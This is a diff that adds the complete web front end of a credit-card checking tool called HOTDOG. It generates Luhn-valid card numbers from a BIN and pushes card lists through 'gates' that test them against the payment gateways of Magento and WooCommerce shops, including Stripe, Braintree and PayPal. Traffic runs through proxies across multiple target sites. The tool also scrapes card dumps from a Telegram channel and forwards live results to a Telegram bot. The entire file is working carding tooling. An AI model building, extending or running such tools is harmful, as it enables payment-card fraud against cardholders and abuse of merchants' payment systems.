@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" type="text/css" href="assets/css/blackvatican.css">
+    <link rel="icon" href="assets/img/blackvatican.png" type="image/png">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@48,400,0,0" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>HOTDOG</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap');
+
+        .swal2-confirm {
+            background-color: gray !important;
+            color: white !important;
+        }
+        .swal2-popup {
+            background-color: black !important;
+            border: 2px solid white !important; 
+            color: white;
+        }
+
+        body {
+            background-color: #121212;
+            font-family: 'Poppins', sans-serif;
+            /* font-family: 'Inconsolata', monospace; */
+            color: #ffffff;
+        }
+
+        textarea {
+            resize: none;
+        }
+
+        .block {
+            width: 100%;
+        }
+
+        .black-vatican,
+        .black-vatican:hover,
+        .black-vatican:active,
+        .black-vatican:focus {
+            border-color: #ffffff;
+            background-color: #121212;
+            color: #ffffff;
+        }
+
+        .card {
+            background-color: #121212;
+            box-shadow: 0 0 5px #ffffff;
+            border-color: #ffffff;
+            background-color: #121212;
+        }
+
+        .px-1 {
+            margin-top: auto;
+        }
+
+        #cards {
+            background-color: #121212;
+            color: #ffffff;
+            justify-content: center;
+            font-family: 'Roboto Mono', monospace;
+            text-align: center;
+            font-size: .9em;
+        }
+
+        img {
+            width: 60%;
+            max-width: 60%;
+            height: auto;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            filter: grayscale(100%);
+        }
+
+        #counter {
+            font-size: 80%;
+        }
+
+        .btn-outline-light,
+        .btn-outline-light:hover {
+            background-color: #121212;
+            color: #ffffff;
+            border: 1px solid #ffffff;
+        }
+
+        #cvv-show-btn,
+        #ccn-show-btn,
+        #dead-show-btn {
+            font-family: 'Roboto Mono', monospace;
+        }
+
+        #cvv-clear-btn,
+        #ccn-clear-btn,
+        #dead-clear-btn {
+            font-family: 'Roboto Mono', monospace;
+            margin-right: 5px;
+        }
+        .material-symbols-outlined {
+            vertical-align: top;
+        }
+
+        #cvv-div,
+        #ccn-div,
+        #dead-div {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 80%;
+        }
+
+        .badge {
+            color: white;
+            border: 1px solid #ffffff;
+            background-color: transparent;
+            font-size: 90%;
+        }
+
+        .float-right {
+            float: right;
+        }
+
+        .slider-container {
+            display: flex;
+            align-items: center;
+            width: 180px;
+        }
+
+        input[type="range"] {
+            -webkit-appearance: none;
+            width: 125px; 
+            height: 8px; 
+            background: #ccc; 
+            border-radius: 5px;
+            outline: none;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 20px;
+            height: 20px;
+            background: #333; 
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        input[type="range"]::-moz-range-thumb {
+            width: 20px;
+            height: 20px;
+            background: #333;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        #concurrent-value {
+            font-weight: bold;
+            color: white;
+            white-space: nowrap;
+        }
+
+        .progress-bar-container {
+            background-color: #333; 
+            color: #fff; 
+        }
+
+        .progress-bar {
+            background-color: #555; 
+            border-radius: 3px;
+            padding: 3px;
+        }
+
+        .textarea-container {
+            display: flex;
+            position: relative;
+        }
+
+        .line-numbers {
+            padding: 5px;
+            background-color: #333;
+            color: #ccc;
+            text-align: right;
+            user-select: none;
+            font-family: monospace;
+            overflow: hidden;
+            border-right: 1px solid #555;
+            height: 250px;
+            box-sizing: border-box;
+        }
+
+        #lineNumbers {
+            min-width: 25px;
+        }
+
+        textarea#modalInput {
+            width: 100%;
+            font-family: monospace;
+            padding-left: 10px;
+            background-color: transparent;
+            height: 250px;
+            box-sizing: border-box;
+            overflow-x: auto; 
+            overflow-y: auto; 
+            white-space: pre; 
+            word-wrap: normal;
+        }
+
+        .textarea-container {
+            position: relative;
+            flex-grow: 1;
+        }
+
+    </style>
+</head>
+
+<body>
+    <div class="container-fluid">
+        <div class="row mx-2 mt-4">
+            <div class="col-md-3">
+                <div class="card h-100">
+                    <div class="card-header black-vatican">Card Generator</div>
+                    <div class="card-body">
+                        <textarea id="bin" class="form-control mb-2 black-vatican" rows="1"
+                            placeholder="Bin"></textarea>
+                        <div class="row mb-2">
+                            <div class="col pe-0">
+                                <select id="month" class="form-control shadow-none black-vatican">
+                                    <option value="" selected="true">Month</option>
+                                    <option value="01">1</option>
+                                    <option value="02">2</option>
+                                    <option value="03">3</option>
+                                    <option value="04">4</option>
+                                    <option value="05">5</option>
+                                    <option value="06">6</option>
+                                    <option value="07">7</option>
+                                    <option value="08">8</option>
+                                    <option value="09">9</option>
+                                    <option value="10">10</option>
+                                    <option value="11">11</option>
+                                    <option value="12">12</option>
+                                </select>
+                            </div>
+                            <div class="col pw-0">
+                                <select id="year" class="form-control shadow-none black-vatican">
+                                    <option value="" selected="true">Year</option>
+                                    <option value="2024">24</option>
+                                    <option value="2025">25</option>
+                                    <option value="2026">26</option>
+                                    <option value="2027">27</option>
+                                    <option value="2028">28</option>
+                                    <option value="2029">29</option>
+                                    <option value="2030">30</option>
+                                    <option value="2031">31</option>
+                                    <option value="2032">32</option>
+                                    <option value="2033">33</option>
+                                    <option value="2034">34</option>
+                                    <option value="2035">35</option>
+                                    <option value="2036">36</option>
+                                    <option value="2037">37</option>
+                                    <option value="2038">38</option>
+                                    <option value="2039">39</option>
+                                    <option value="2040">40</option>
+                                </select>
+                            </div>
+                        </div>
+                        <textarea id="cvv" class="form-control mb-2 shadow-none black-vatican" rows="1"
+                            placeholder="xxx"></textarea>
+                        <textarea id="amount" class="form-control mb-2 shadow-none black-vatican" rows="1"
+                            placeholder="Amount"></textarea>
+                        <button class="btn btn-outline-light block mb-2 shadow-none" id="generate">Generate</button>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md">
+                <div class="card h-100">
+                    <div class="card-header black-vatican">Credit Cards</div>
+                    <div class="card-body h-100">
+                        <div class="mt-1 mx-1">
+                            <textarea class="form-control shadow-none mb-2" id="cards" rows="5"
+                                placeholder="xxxxxxxxxxxxxxxx|xx|xxxx|xxx" oninput="limit(this, 5000)"></textarea>
+                            
+                            <div class="row mb-2">
+                                <div class="col-md-9 pe-0"> 
+                                    <select id="gates" class="form-control shadow-none black-vatican">
+                                        <option value="mageb3.php">MAGENTO CVV B3</option><option value="mageb3ccn.php">MAGENTO CCN B3</option><option value="mageb3v2.php">MAGENTO CVV B3 V2</option><option value="mageb3v2lookup.php">MAGENTO CVV B3 V2 [3DS]</option><option value="magestripe.php">MAGENTO CVV STRIPE</option><option value="magestripeccn.php">MAGENTO CCN STRIPE</option><option value="ror.php">=================</option><option value="woob3.php">WOO BRAINTREE CVV</option><option value="wooppcpcvv.php">WOO PPCP CVV (ppcp-credit-card-gateway/angelleye_ppcp)</option><option value="wooppcpccn.php">WOO PPCP CCN (ppcp-credit-card-gateway/angelleye_ppcp)</option><option value="wooppcpcvvv2.php">WOO PPCP CVV2 (ppcp-gateway)</option><option value="wooppcpccnv2.php">WOO PPCP CCN2 (ppcp-gateway)</option><option value="wooppro.php">WOO PAYPAL PRO CVV (paypal_pro/paypalpro)</option><option value="woopprov2.php">WOO PAYPAL PRO CVV (paypal-pro/paypal_pro_payflow)</option><option value="wooeway.php">WOO EWAY</option><option value="woostripecvv.php">WOO STRIPE CVV</option><option value="woostripeccn.php">WOO STRIPE CCN</option>                                    </select>
+                                </div>
+                                <div class="col-md-3 ps-1"> 
+                                    <select id="xlite" class="form-control shadow-none black-vatican">
+                                        <option value="default">Default</option>
+                                        <option value="lite">Lite</option>
+                                    </select>
+                                </div>
+                            </div>
+                            
+                            <div class="row mt-2">
+                                <div class="col pe-0">
+                                    <button class="btn btn-outline-light block shadow-none" id="start">Start</button>
+                                </div>
+                                <div class="col pw-0">
+                                    <button class="btn btn-outline-light block shadow-none" id="format">Format</button>
+                                </div>
+                                <div class="col pw-0">
+                                    <button class="btn btn-outline-light block shadow-none" id="stop">Stop</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card h-100">
+                    <div class="card-header d-flex justify-content-between align-items-center black-vatican">
+                        <span>Config</span>
+
+                        <div class="d-flex align-items-center">
+                            <div class="slider-container">
+                                <input type="range" id="concurrent-bar" min="1" max="30" value="5" class="form-control-range">
+                                <span id="concurrent-value" class="ml-3">5</span>
+                            </div>
+                        </div>
+                        <button class="btn btn-outline-light btn-sm float-right shadow-none" id="config-visibility">
+                            <span class="material-symbols-outlined">visibility</span>
+                        </button>
+                    </div>
+                    <input type="text" id="proxy" class="form-control black-vatican" style="text-align: center;" placeholder="ip:port:username:password">
+                    <input type="text" id="sites" class="form-control black-vatican" style="text-align: center; padding-right: 30px;" placeholder="Please input your website URL/s">
+                    <span class="input-group-text black-vatican" id="editIcon" style="position: absolute; right: 5px; top: 35%; transform: translateY(-50%); background: transparent; border: none; cursor: pointer;"><i class="fas fa-edit"></i></span>
+                    <button type="button" class="btn btn-outline-light block mb-2 shadow-none" style="color: yellow;" id="oForwarderModal">FORWARDER</button>
+                    <div class="text-center black-vatican">SCRAPER</div>
+                    <input type="text" id="scraper" class="form-control black-vatican" style="text-align: center;" placeholder="CHANNEL ID:COUNT">
+                    <button type="button" class="text-center black-vatican" onclick="startScraper()" style="color: yellow;">START SCRAPER</button>
+                    
+                    
+                    <div class="px-1 d-flex justify-content-center align-items-center">
+                        <div class="row text-center" id="counter">
+                            <div class="col-auto">
+                                CVV : <span id="m-count">0</span>
+                            </div>
+                            <div class="col-auto">
+                                CCN : <span id="n-count">0</span>
+                            </div>
+                            <div class="col-auto">
+                                DEAD : <span id="d-count">0</span>
+                            </div>
+                            <div class="col-auto">
+                                CHECKING: <span id="c-count">0</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="progress-bar-container">
+                        <div class="progress-bar"></div>
+                    </div>
+                </div>
+            </div>
+            </div>
+            </div>
+        </div>
+        <div class="mx-3 mt-4">
+                <div class="card mb-3">
+                    <div class="card-header black-vatican">
+                        CVV
+                        <button class="btn btn-outline-light btn-sm float-right shadow-none" id="cvv-show-btn"> 
+                            <span class="material-symbols-outlined">visibility</span></button>
+                        <button class="btn btn-outline-light btn-sm float-right shadow-none" id="cvv-clear-btn">
+                            <span class="material-symbols-outlined">delete</span></button>
+                        <button class="btn btn-outline-light btn-sm float-right shadow-none" id="cvv-copy-btn">
+                            <span class="material-symbols-outlined">content_copy</span></button>
+                    </div>
+                    <div class="card-body">
+                        <div id="cvv-div"></div>
+                    </div>
+                </div>
+                <div class="card mb-3">
+                    <div class="card-header black-vatican">
+                        CCN
+                        <button class="btn btn-outline-light btn-sm float-right shadow-none" id="ccn-show-btn"> 
+                            <span class="material-symbols-outlined">visibility</span></button>
+                        <button class="btn btn-outline-light btn-sm float-right shadow-none" id="ccn-clear-btn">
+                            <span class="material-symbols-outlined">delete</span></button>
+                        <button class="btn btn-outline-light btn-sm float-right shadow-none" id="ccn-copy-btn">
+                            <span class="material-symbols-outlined">content_copy</span></button>
+                    </div>
+                    <div class="card-body">
+                        <div id="ccn-div"></div>
+                    </div>
+                </div>
+                <div class="card mb-3">
+                    <div class="card-header black-vatican">
+                        DEAD
+                        <button class="btn btn-outline-light btn-sm float-right shadow-none" id="dead-show-btn"> 
+                            <span class="material-symbols-outlined">visibility</span></button>
+                        <button class="btn btn-outline-light btn-sm float-right shadow-none" id="dead-clear-btn">
+                            <span class="material-symbols-outlined">delete</span></button>
+                        <button class="btn btn-outline-light btn-sm float-right shadow-none" id="dead-copy-btn">
+                            <span class="material-symbols-outlined">content_copy</span></button>
+                    </div>
+                    <div class="card-body">
+                        <div id="dead-div"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal fade" id="forwarderModal" tabindex="-1" aria-labelledby="forwarderModalLabel" aria-hidden="true">
+        <div class="modal-dialog" style="max-width: 400px;">
+            <div class="modal-content black-vatican">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="forwarderModalLabel" style="font-size: 1.25rem;">Forwarder</h5>
+                    <button type="button" class="btn-close black-vatican" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body text-center">
+                    <div class="mb-3"><input type="text" id="botToken" class="form-control black-vatican" placeholder="BOT TOKEN" style="width: 100%; margin: auto;"></div>
+                    <div class="mb-3"><input type="text" id="chatID" class="form-control black-vatican" placeholder="CHAT ID" style="width: 100%; margin: auto;"></div>
+                    <button type="button" class="btn btn-outline-light" id="testButton" style="color: yellow; width: 50%;">Test Forwarder</button>
+                    <div id="testResult" style="display: none; margin-top: 10px;">
+                        <span id="resultMessage"></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal fade" id="sitesModal" tabindex="-1" aria-labelledby="sitesModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content black-vatican">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="sitesModalLabel">Edit URL/s</h5>
+                    <button type="button" class="btn-close black-vatican" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body" style="max-height: 500px; overflow-y: auto;">
+                    <div class="textarea-container">
+                        <div class="line-numbers" id="lineNumbers"></div>
+                        <textarea id="modalInput" class="form-control black-vatican" style="height: 250px; text-align: left;" placeholder="Please input your website URL/s"></textarea>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary black-vatican" data-bs-dismiss="modal">Close</button>
+                    <button type="button" class="btn btn-primary black-vatican" id="saveButton">Save changes</button>
+                    <button type="button" class="btn btn-info black-vatican" id="formatButton">Format URLs</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var oForwarderModalButton = document.getElementById('oForwarderModal');
+            var testButton = document.getElementById('testButton');
+            var testResult = document.getElementById('testResult');
+            var resultMessage = document.getElementById('resultMessage');
+            var botTokenInput = document.getElementById('botToken');
+            var chatIDInput = document.getElementById('chatID'); 
+
+            oForwarderModalButton.addEventListener('click', function () {
+                var modal = new bootstrap.Modal(document.getElementById('forwarderModal'));
+                modal.show();
+            });
+
+            testButton.addEventListener('click', function () {
+                var botTokenValue = botTokenInput.value.trim();
+                var chatIDValue = chatIDInput.value.trim();
+
+                if (botTokenValue === '' || chatIDValue === '') {
+                    resultMessage.textContent = 'Please enter valid BOT TOKEN and CHAT ID';
+                    resultMessage.style.color = 'red';
+                    testResult.style.display = 'block';
+                    return;
+                }
+
+                var apiUrl = `https://api.telegram.org/bot${botTokenValue}/sendMessage?chat_id=${chatIDValue}&text=ZXC MAHINA&parse_mode=html`;
+                
+                fetch(apiUrl)
+                    .then(response => {
+                        if (response.ok) {
+                            return response.json();
+                        }
+                        throw new Error(''); 
+                    })
+                    .then(data => {
+                        resultMessage.textContent = 'Message sent successfully!';
+                        resultMessage.style.color = 'green';
+                        testResult.style.display = 'block';
+                    })
+                    .catch(error => {
+                        resultMessage.textContent = 'Failed to send message.';
+                        resultMessage.style.color = 'red';
+                        testResult.style.display = 'block';
+                    });
+            });
+        });
+    </script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var editIcon = document.getElementById('editIcon');
+            var sitesInput = document.getElementById('sites');
+            var modalInput = document.getElementById('modalInput');
+            var saveButton = document.getElementById('saveButton');
+            var formatButton = document.getElementById('formatButton');
+            var lineNumbers = document.getElementById('lineNumbers');
+
+            function updateLineNumbers() {
+                var lines = modalInput.value.split('\n').length;
+                lineNumbers.innerHTML = '';
+                for (var i = 1; i <= lines; i++) {
+                    lineNumbers.innerHTML += i + '<br>';
+                }
+            }
+
+            editIcon.addEventListener('click', function () {
+                var inputText = sitesInput.value;
+                var urlPattern = /((http:\/\/|https:\/\/)[^\s,]+)/g;
+                var matches = inputText.match(urlPattern);
+
+                if (matches) {
+                    modalInput.value = matches.join('\n');
+                } else {
+                    modalInput.value = '';
+                }
+
+                updateLineNumbers();
+
+                var modal = new bootstrap.Modal(document.getElementById('sitesModal'));
+                modal.show();
+            });
+
+            modalInput.addEventListener('input', function () {
+                updateLineNumbers();
+            });
+
+            modalInput.addEventListener('scroll', function () {
+                lineNumbers.scrollTop = modalInput.scrollTop;
+            });
+
+            saveButton.addEventListener('click', function () {
+                var inputText = modalInput.value;
+                var urls = inputText.split('\n').filter(Boolean);
+
+                sitesInput.value = urls.join(',');
+                var modalElement = document.getElementById('sitesModal');
+                var modal = bootstrap.Modal.getInstance(modalElement);
+                modal.hide();
+            });
+
+            formatButton.addEventListener('click', function () {
+                var inputText = modalInput.value;
+                var urlPattern = /((http:\/\/|https:\/\/)[^\s,]+)/g;
+                var matches = inputText.match(urlPattern);
+
+                if (matches) {
+                    var formattedUrls = matches.map(function (url) {
+                        return url.trim();
+                    });
+                    modalInput.value = formattedUrls.join('\n');
+                } else {
+                    modalInput.value = '';
+                }
+
+                updateLineNumbers();
+            });
+        });
+    </script>
+
+</body>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"
+    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"
+    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js"></script>
+<script type="text/javascript">
+    $(document).ready(function () {
+        let activeRequests = 0;
+        let maxCount = 5;
+        let stopRequest = false;
+        let queue = []; 
+
+        const cvvSound = new Audio('assets/sounds/cvv.mp3');
+        const ccnSound = new Audio('assets/sounds/ccn.mp3');
+
+        $("#concurrent-bar").on("input", function () {
+            maxCount = $(this).val();
+            $("#concurrent-value").text(maxCount + "");
+        });
+
+        $("#config-visibility").click(function () {
+            const isHidden = $("#proxy").attr("type") === "text";
+            $("#proxy, #sites, #scraper").attr("type", isHidden ? "password" : "text");
+            $("#config-visibility .material-symbols-outlined").text(isHidden ? "visibility_off" : "visibility");
+        });
+
+        $("#cvv-show-btn").click(() => $("#cvv-div").slideToggle());
+        $("#ccn-show-btn").click(() => $("#ccn-div").slideToggle());
+        $("#dead-show-btn").click(() => $("#dead-div").slideToggle());
+
+        $("#cvv-clear-btn").click(() => $(".m").remove());
+        $("#ccn-clear-btn").click(() => $(".n").remove());
+        $("#dead-clear-btn").click(() => $(".d").remove());
+
+        $("#cvv-copy-btn").click(() => copyToClipboard("#cvv-div"));
+        $("#ccn-copy-btn").click(() => copyToClipboard("#ccn-div"));
+        $("#dead-copy-btn").click(() => copyToClipboard("#dead-div"));
+
+        function copyToClipboard(selector) {
+            var text = $(selector).find('div').map(function () {
+                return $(this).text().replace(/\s+/g, ' ').trim();
+            }).get().join("\n");
+
+            var $temp = $("<textarea>");
+            $("body").append($temp);
+            $temp.val(text).select();
+            document.execCommand("copy");
+            $temp.remove();
+
+            Swal.fire({
+                title: "Copied to Clipboard!",
+                text: "Results copied.",
+                icon: "success",
+                customClass: {
+                    confirmButton: 'swal2-confirm',
+                    popup: 'swal2-popup'
+                }
+            });
+        }
+
+        $("#format").click(function () {
+            var card = $("#cards").val();
+            $("#cards").val(
+                Array.from(new Set(card.match(/(?:\d{10,}|\d+)\|\d*\|\d*\|\d*/g) || [])).join("\n")
+            );
+        });
+
+        $("#start").click(function () {
+            stopRequest = false; 
+            let card = $("#cards").val().split("\n");
+            let gate = $("#gates").val();
+            let proxy = $("#proxy").val();
+            let sites = $("#sites").val();
+            let botToken = $("#botToken").val();
+            let chatID = $("#chatID").val();
+            let xlite = $("#xlite").val();
+            let total = card.length;
+            let cvv = 0, ccn = 0, dead = 0, remaining = total;
+            Swal.fire({
+                title: "Checker Started!",
+                text: 'Checking ' + total + ' card/s.',
+                icon: "success",
+                customClass: {
+                    confirmButton: 'swal2-confirm',
+                    popup: 'swal2-popup'
+                }
+            });
+
+            let index = 0;
+
+            function processQueue() {
+                if (stopRequest || index >= card.length || activeRequests >= maxCount) return;
+
+                let value = card[index++];
+                queue.push(value);
+
+                if (activeRequests < maxCount) {
+                    sendRequest(queue.shift());
+                }
+            }
+
+            function sendRequest(value) {
+                activeRequests++;
+
+                $.ajax({
+                    url: 'api/' + gate + '?card=' + value +
+                        '&proxy=' + proxy +
+                        '&sites=' + sites +
+                        '&botToken=' + botToken +
+                        '&chatID=' + chatID +
+                        '&xlite=' + xlite,
+                    type: 'GET',
+                    async: true,
+                    success: function (result) {
+                        if (result.includes("#CVV")) {
+                            $("#cvv-div").append('<div class="m"><span class="badge"> CVV </span> ' + value + ' ' + result.replace("#CVV ", "") + '</div>');
+                            cvv++;
+                            cvvSound.play();
+                        } else if (result.includes("#CCN")) {
+                            $("#ccn-div").append('<div class="n"><span class="badge"> CCN </span> ' + value + ' ' + result.replace("#CCN ", "") + '</div>');
+                            ccn++;
+                            ccnSound.play();
+                        } else {
+                            $("#dead-div").append('<div class="d"><span class="badge"> DEAD </span> ' + value + ' ' + result.replace("#DEAD", "") + '</div>');
+                            dead++;
+                        }
+                        remaining--;
+
+                        $('#m-count').html(cvv);
+                        $('#n-count').html(ccn);
+                        $('#d-count').html(dead);
+                        $('#c-count').html(remaining);
+
+                        update();
+                    },
+                    complete: function () {
+                        activeRequests--;
+                        if (queue.length > 0) {
+                            sendRequest(queue.shift());
+                        } else {
+                            processQueue(); 
+                        }
+                    }
+                });
+            }
+
+            for (let i = 0; i < maxCount && i < card.length; i++) {
+                processQueue();
+            }
+        });
+
+        $("#stop").click(function () {
+            stopRequest = true;
+
+            Swal.fire({
+                title: "Stop Requested!",
+                text: "No further requests will be initiated, but ongoing requests will continue.",
+                icon: "info",
+                customClass: {
+                    confirmButton: 'swal2-confirm',
+                    popup: 'swal2-popup'
+                }
+            });
+        });
+    });
+
+    function progressBar() {
+        var total = parseInt($('#c-count').html()) + parseInt($('#m-count').html()) + parseInt($('#n-count').html()) + parseInt($('#d-count').html());
+        var remaining = parseInt($('#c-count').html());
+        var percentage = ((total - remaining) / total) * 100;
+        $('.progress-bar').css('width', percentage + '%');
+    }
+
+    function update() {
+        var card = $("#cards").val().split("\n");
+        card.splice(0, 1);
+        $("#cards").val(card.join("\n"));
+        progressBar();
+    }
+</script>
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function startScraper() {
+        var scraper = document.getElementById("scraper").value;
+
+        Swal.fire({
+            title: "SCRAPER STARTED!",
+            text: "SCRAPING MIGHT TAKE A WHILE.",
+            icon: "info",
+            customClass: {
+                confirmButton: 'swal2-confirm',
+                popup: 'swal2-popup'
+            }
+        });
+
+        var url = "scraper.php?scraper=" + encodeURIComponent(scraper);
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", url, true);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                var ccData = xhr.responseText;
+                document.getElementById("cards").value = ccData; 
+            }
+        };
+        xhr.send();
+    }
+
+    document.getElementById("scraperButton").addEventListener("click", startScraper);
+</script>
+
+<script>
+    function limit(textarea, maxLines) {
+        var lines = textarea.value.split("\n");
+        if (lines.length > maxLines) {
+            textarea.value = lines.slice(0, maxLines).join("\n");
+        }
+    }
+</script>
+
+<script type="text/javascript">
+    $("#generate").click(function () {
+        document.getElementById("cards").value = gen();
+    });
+
+    function gen() {
+        var amt = $("#amount").val();
+        if (amt.length == 0) {
+            amt = 100;
+        }
+        var ccs = [];
+        for (x = 0; x < amt; x++) {
+            ccs.push(generate());
+        }
+        return ccs.join("\n");
+    }
+    function rand(rlength) {
+        var randa = [];
+        while (randa.length < rlength) {
+            var rand = Math.floor(Math.random() * 10);
+            randa.push(rand);
+        }
+        return randa.join('');
+    }
+
+    function generate() {
+        var bvbin = $("#bin").val();
+        var bvmonth = $("#month").val();
+        var bvyear = $("#year").val();
+        var bvcvv = $("#cvv").val();
+        var cci = bvbin + rand(15 - bvbin.length);
+        var evena = [];
+        var odda = [];
+        for (var e = 0; e < 15; e += 2) {
+            var even = cci[e] * 2;
+            if (even.toString().length == 2) {
+                even = even.toString().split('');
+                even = parseInt(even[0]) + parseInt(even[1]);
+            }
+            evena.push(even);
+        }
+        for (var o = 1; o < 15; o += 2) {
+            var odd = cci[o];
+            odda.push(odd);
+        }
+        var odds = eval(odda.join('+'));
+        var evens = eval(evena.join('+'));
+        var total = odds + evens;
+        var csum = 10 - total.toString()[1];
+        if (csum == 10) {
+            csum = 0;
+        }
+        if (fyear(bvyear).length == 4) {
+            return cci + csum + '|' + fmonth(bvmonth) + '|' + fyear(bvyear) + '|' + fcvv(bvcvv);
+        }
+        else {
+            return cci + csum + '|' + fmonth(bvmonth) + '|202' + fyear(bvyear) + '|' + fcvv(bvcvv);
+        }
+    }
+
+    function fmonth(bvmonth) {
+        if (bvmonth) {
+            return bvmonth;
+        }
+        else {
+            var bvmonth = Math.floor(Math.random() * 12) + 1;
+            if (bvmonth.toString().length == 1) {
+                bvmonth = '0' + bvmonth;
+            }
+            return bvmonth;
+        }
+    }
+    function fyear(bvyear) {
+        if (bvyear) {
+            return bvyear;
+        }
+        else {
+            return Math.floor(Math.random() * 8) + 2;
+        }
+    }
+
+    function fcvv(bvcvv) {
+        if (bvcvv) {
+            return bvcvv;
+        }
+        else {
+            cvva = [];
+            while (cvva.length < 3) {
+                var cvv = Math.floor(Math.random() * 10);
+                cvva.push(cvv);
+            }
+            return cvva.join('');
+        }
+    }
+</script>
+
+</html>
